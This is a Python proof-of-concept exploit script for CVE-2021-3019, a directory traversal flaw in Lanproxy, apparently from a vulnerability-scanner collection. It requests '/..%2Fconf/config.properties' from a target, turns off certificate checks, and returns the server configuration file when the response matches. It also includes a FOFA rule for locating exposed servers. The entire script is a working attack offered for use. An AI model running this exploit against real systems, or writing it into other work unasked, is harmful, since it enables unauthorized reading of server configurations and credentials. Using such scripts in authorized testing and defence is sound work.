#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='CVE-2021-3019'
AUTHOR="Joker"
REMARK='Lanproxy 目录遍历漏洞 '
FOFA_RULE='header= "Server: LPS-0.1"'
######################################################

def poc(target):
    result={}
    vuln_url = target + "/..%2Fconf/config.properties"

    headers = {
        "User-Agent":ua,
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6", 
        "Upgrade-Insecure-Requests": "1"
    }
    try:

        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
        if "config.server" in r.text and r.status_code == 200:
            result['target'] = target
            result['poc'] = NAME
            result['data'] = str(r.text)
            return result
        else:
            pass
    except:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")